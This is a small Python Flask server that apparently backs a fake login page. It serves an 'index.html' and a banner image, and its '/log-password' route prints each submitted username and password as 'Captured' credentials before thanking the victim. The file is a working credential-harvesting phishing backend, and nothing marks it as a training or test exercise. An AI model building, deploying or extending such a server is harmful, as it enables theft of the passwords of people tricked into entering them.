from flask import Flask, request, render_template, redirect, url_for, send_from_directory

app = Flask(__name__)

# Serve the static HTML page at root
@app.route('/')
def serve_login():
    return send_from_directory('.', 'index.html')

# Serve the image
@app.route('/banner.jpeg')
def serve_image():
    return send_from_directory('.', 'banner.jpeg')


@app.route('/log-password', methods=['POST'])
def log_password():
     username = request.form.get('username')
     password = request.form.get('password')
     print(f"Captured username: {username}")
     print(f"Captured password: {password}")
     return "Thank you! Your credentials have been received."

if __name__ == '__main__':
    app.run()
